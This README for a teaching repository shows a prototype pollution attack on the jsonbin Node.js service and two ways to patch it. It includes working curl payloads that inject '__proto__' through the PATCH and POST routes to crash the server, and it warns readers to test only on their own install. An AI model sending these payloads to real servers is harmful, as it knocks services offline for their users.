# Prototype Pollution Exploit and Patching Example

This repo provides an DDoS attack example that exploit the prototype pollution vulnerability.

Two versions of patch code is also provided.

## Install and Usage

### Run the vulnerable code

- Dependencies: MongoDB, NodeJS, NPM
- Before installation, register your app with GitHub to obtain an authorization token using this [guide](https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app).

- Project code with installation instructions: https://github.com/remy/jsonbin
- Follow the instruction in https://jsonbin.org to use the service.

### Run the patched code

1. Make sure that dependencies are installed (MongoDB, NodeJS, NPM). Also your app is registered with GitHub using this [guide](https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app).
2. Download the code: `git clone https://github.com/kccarlos/prototypepollutionpatching.git`
2. Navigate to the project folder `cd prototypepollutionpatching/patchv1` or `cd prototypepollutionpatching/patchv2` (Two versions provided)
3. run `npm install`
4. Set the configurations in `.dev.env` before running. An example is provided in `example.env`

## Exploit the Vulnerability

***!!! Be ethical: do not exploit the real website. Please install and run the source code and try the following exploit on your own machine.***

**Vulnerability 1**: exploiting the `/Patch` route

```bash
curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \
     -H 'authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' \
     -d '{  }'

curl -X PATCH http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \
   -H 'authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' \
   -d '{ "__proto__" : { "toString" : "attack"} }'
```

**Vulnerability 2**: exploiting the `/Post` route

```bash

curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/__proto__/toString \
    -H 'authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' \
    -d '"attack"'
```

After this attack, the server cannot response to requests. Therefore an DDos attack is completed.

## Patch Version 1

The vulnerable code is `undefsafe()` and `jsonmergepatch()` in `lib/routes/api.js`.

To fix this issue, we may add a checking command before these functions are called in `router.patch()`:

```javascript
for (var key in req.body) {
  if (req.body.hasOwnProperty('__proto__')) {
    return res.status(404).json(null);
  }
}
```

In `router.post()`, there is a easier way to fix the vulnerability: checking the URL of the request.

```javascript
if (req.path.includes('__proto__') ) {
  return res.status(404).json('Invalid input');
}
```

Code is available in `./patchv1`.

## Patch Version 2

We may patch the  vulnerability using `Object.prototype.freeze()`. First, we freeze the base object's prototype property before executing `undefsafe()` and `jsonmergepatch()` in both `router.patch()` and `router.post()` functions:

```javascript
Object.freeze(Object.prototype);
```

Now the server will not fail and cause DDoS due to the vulnerability in `/Patch` and `/Post`.

Full code is available in `./patchv2`.
